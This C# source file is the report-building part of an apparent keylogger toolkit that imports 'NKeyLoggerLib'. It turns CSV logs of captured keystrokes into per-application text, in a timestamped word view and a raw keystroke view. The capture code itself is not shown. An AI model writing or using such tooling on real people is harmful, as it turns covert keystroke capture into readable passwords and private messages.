using System;
using System.Collections.Frozen;
using System.Collections.Generic;
using System.Linq;
using System.Runtime;
using System.Text;
using System.Threading.Tasks;
using NKeyLoggerLib;

namespace ReportMaker;
internal class ReportGenerator
{
    private const short DATE_THRESHOLD = 5;
    private static string TEMP_PATH = AppDomain.CurrentDomain.BaseDirectory + "temp";
    private static string RAW_REPORT_PATH = TEMP_PATH + "\\" + "RawReport.temp";
    private static string PROCESSED_REPORT_PATH = TEMP_PATH + "\\" + "ProcessedReport.temp";
    private readonly Dictionary<string,Context> contextMap = new Dictionary<string,Context>();
    private static FrozenSet<string> separators = new HashSet<string>()
    {
        ",", "SPACE", ";", "\"", "'", ":", "=", "+", "*", "ENTER", "(", ")", "[", "]", "<", ">", "!", "?", "TAB", " "
    }.ToFrozenSet();
    private DirectoryInfo? dirInfo;
    private string reportPath { get; init; }
    public ReportGenerator(string targetPath)
    {
        reportPath = targetPath;
    }

    public void generate(string path)
    {
        dirInfo = Directory.CreateDirectory(TEMP_PATH);
        this.isFirstToken = true;
        contextMap.Clear();
        using CSVReader reader = new CSVReader(path);
        reader.EndOfFileEvent += saveTokenToProcessedFile;
        reader.read(appendToProcessedReport);

        foreach (var pair in contextMap)
        {
            File.AppendAllText(PROCESSED_REPORT_PATH, pair.Key + ":\n");
            joinFile(PROCESSED_REPORT_PATH, pair.Value.TempFilePath);
            File.Delete(pair.Value.TempFilePath);
        }

        contextMap.Clear();

        reader.read(appendToRawReport);
        foreach (var pair in contextMap)
        {
            File.AppendAllText(RAW_REPORT_PATH, pair.Key + ":\n");
            joinFile(RAW_REPORT_PATH, pair.Value.TempFilePath);
            File.Delete(pair.Value.TempFilePath);
        }

        generateFinnalyReport();

        File.Delete(PROCESSED_REPORT_PATH);
        File.Delete(RAW_REPORT_PATH);
        dirInfo.Delete();
    }

    private void generateFinnalyReport()
    {
        File.Delete(reportPath);
        File.AppendAllText(reportPath, "|Processed View|\r\n");
        joinFile(reportPath, PROCESSED_REPORT_PATH);
        File.AppendAllText(reportPath, "\r\n\r\n");
        File.AppendAllText(reportPath, "|Raw View|\r\n");
        joinFile(reportPath, RAW_REPORT_PATH);
    }
    private void joinFile(string mainFilePath, string childFilePath)
    {
        using (FileStream fileStream = File.Open(mainFilePath,FileMode.OpenOrCreate))
        {
            using StreamWriter writer = new StreamWriter(fileStream);
            fileStream.Seek(fileStream.Length, SeekOrigin.Begin);
            using StreamReader reader = new StreamReader(childFilePath);
            string? line = null;
            while ((line = reader.ReadLine()) != null)
            {
                writer.WriteLine(line);
            }
        }
    }

    private bool isFirstToken = true;
    private void appendToProcessedReport(KeyInfo? info)
    {
        if (info == null)
            return;

        bool isSep = separators.Any(elem =>
        {
            return elem.ToLower() == info.Key.ToLower();
        });

        KeyInfo? lastKeyInfo = getContext(info).CurrentKey;

        bool isLastSep = separators.Any(elem =>
        {
            if(lastKeyInfo == null)
                return false;
            return elem.ToLower() == lastKeyInfo.Key.ToLower();
        });

        if (isLastSep && isSep)
        {
            return;
        }

        if (info.Key.Length == 1 && !isSep)
        {
            getContext(info).CurrentKey = info;
        } else if (isSep || isChangedLang(info, lastKeyInfo))
        {
            Context ctx = getContext(info);
            string token = ctx.Token;

            if (token == string.Empty)
                return;
            string newLine = (!isFirstToken) ? "\r\n" : "";
            if (isDateDiffMoreThreshold(info.Timestamp, lastKeyInfo?.Timestamp) || isFirstToken)
                File.AppendAllText(ctx.TempFilePath, newLine + info.Timestamp + ": " + token.Trim() + " ");
            else
                File.AppendAllText(ctx.TempFilePath, token.Trim() + " ");

            isFirstToken = false;

        }

    }

    private void appendToRawReport(KeyInfo? info)
    {
        if (info == null)
            return;

        var ctx = getContext(info);

        if (info.Key.Length > 1)
            File.AppendAllText(ctx.TempFilePath, $"[{info.Key}]");
        else
            File.AppendAllText(ctx.TempFilePath, info.Key);
    }

    private void saveTokenToProcessedFile(KeyInfo? info)
    {
        if(info == null) return;

        Context ctx = getContext(info);
        string token = ctx.Token;

        if (token == string.Empty)
            return;

        File.AppendAllText(ctx.TempFilePath, token.Trim() + " ");
    }

    private bool isDateDiffMoreThreshold(string timestampFirst, string? timestampSecond)
    {
        if (timestampSecond == null)
            return true;
        DateTime t1 = DateTime.Parse(timestampFirst);
        DateTime t2 = DateTime.Parse(timestampSecond);
        return DATE_THRESHOLD < (t1 - t2).TotalMinutes;
    }

    private bool isChangedLang(KeyInfo curr, KeyInfo? last){
        if (last == null)
            return false;
        return curr.Language != last.Language;
    }
    private Context getContext(KeyInfo info)
    {
        Context? ctx;
        contextMap.TryGetValue(info.ProcessName, out ctx);
        if (ctx == null)
            ctx = (contextMap[info.ProcessName] = new Context(TEMP_PATH));
        ctx.TempFilePath = info.ProcessName;
        return ctx;
    }

    class Context(string TempDirectoryPath)
    {
        private readonly string TempDirectoryPath = TempDirectoryPath;
        private string tempFilePath = "";
        private StringBuilder token = new StringBuilder();
        private KeyInfo? currentKey = null;

        public string TempFilePath
        {
            get { return tempFilePath; }
            set
            {
                tempFilePath = TempDirectoryPath + "\\" + System.IO.Path.GetFileName(value) + ".temp";
            }
        }
        public KeyInfo? CurrentKey
        {
            get => currentKey;
            set
            {
                token.Append(value?.Key);
                currentKey = value;
            }
        }

        public string Token
        {
            get { 
                string res = (string)token.ToString().Clone();
                token.Clear();
                return res;
            }
        }

    }
}